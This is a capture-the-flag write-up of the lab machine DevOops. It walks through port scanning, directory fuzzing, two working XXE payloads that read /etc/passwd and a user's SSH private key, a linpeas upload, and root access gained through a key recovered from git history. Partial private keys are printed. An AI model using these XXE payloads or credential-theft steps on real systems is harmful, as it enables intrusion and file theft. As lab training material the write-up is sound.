### Initial Port Scan and Enumeration

To begin the attack on DevOops, I performed an extensive port scan.

```
sudo nmap 10.10.11.43 -p- -sC -sV -T4 -v
```

The scan results revealed two open ports:
- 22 (SSH), which is commonly used for secure shell access.
- 5000 (HTTP), suggesting a web service running on a non-standard port.

I proceeded to enumerate the web service hosted on port 5000.

```
ffuf -u http://blogfeeder.htb:5000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 302 -fs 265
```

FFUF identified two significant directories:

- `/upload`: A page allowing file uploads.
- `/feed`: An endpoint that could be related to the blog’s content.

### XML External Entity (XXE) Exploitation

The /upload page accepted XML files, which hinted at the possibility of XXE (XML External Entity) injection. An XXE injection is a web vulnerability that allows an attacker to alter the way a website handles XML data. This vulnerability is most often used to arbitrarily read files on a web server. Below is a payload from [Portswigger](https://portswigger.net/web-security/xxe), modified to comply with the format that the website on this machine asked for (author, subject, content).

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE malicious [
    <!ELEMENT malicious ANY>
    <!ENTITY external SYSTEM "file:////etc/passwd">
]>
<Test>
	<Author>Test</Author>
	<Subject>Testing</Subject>
	<Content>&external;</Content>
</Test>
```

When this payload was uploaded, the server responded with the contents of /etc/passwd, revealing the user accounts on the system. This confirmed the presence of an XXE vulnerability and provided insight into potential SSH users, including the user `roosa`.

Since the goal was to gain remote access via SSH, I next targeted the id_rsa private key of the user `roosa`. Using a similar XXE payload, I requested the contents of `/home/roosa/.ssh/id_rsa`.

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE malicious [
    <!ELEMENT malicious ANY>
    <!ENTITY external SYSTEM "file:///home/roosa/.ssh/id_rsa">
]>
<Root>
<Author>gay</Author>
<Subject>Testing</Subject>
<Content>&external;</Content>
</Root>
```

Sure enough, the server sent back `roosa`'s private key!

roosa.id_rsa
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
...............
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

### Remote Access, RSA Keys, and Git Repositories

With roosa's private key in hand, I logged into the server via SSH. At this point, I began looking for privilege escalation opportunities. The first step was to upload linpeas, a script designed to automate the discovery of misconfigurations, vulnerable software, and other escalation vectors. Anytime a person has SSH credentials, they also have the permissions necessary to use SCP and SFTP (assuming it hasn't been disabled by a system administrator). I'll use this method to get my script on the box. I also ran this script in the background so that I could look around manually while it gathered information. 

```
scp -i roosa.id_rsa ./linpeas.sh roosa@blogfeeder.htb:/home/roosa/linpeas.sh
```

```
./linpeas.sh > linpeas.txt 2> linpeas.txt &
```

While exploring the filesystem, I stumbled upon an unidentified RSA key in the directory `/home/deploy/resources/integration`. This key didn't work for any of the known users, so I continued digging.

authcredentials.key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
......................
qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
```

Next, I found that the application was being managed via a **Git** repository located in `/home/roosa/work/blogfeeder/.git`. Git repositories often contain sensitive information in their commit history, such as credentials or configuration files. I checked the Git log to see if I was so lucky.

```
git log
```

I found a commit, and looked at the differences between the two versions

```
git diff <commit id> 
```

In the diff output, I discovered yet another RSA private key, which I immediately tested for **root** access. Fortunately, this key worked, granting me root privileges!

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
..........................
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

With root access, I was able to navigate to /root and retrieve the root flag! This machine demonstrated the dangers of improperly handling XML inputs, particularly through the XXE vulnerability. It also highlighted the risks associated with exposing sensitive data, such as private SSH keys, via misconfigured web applications.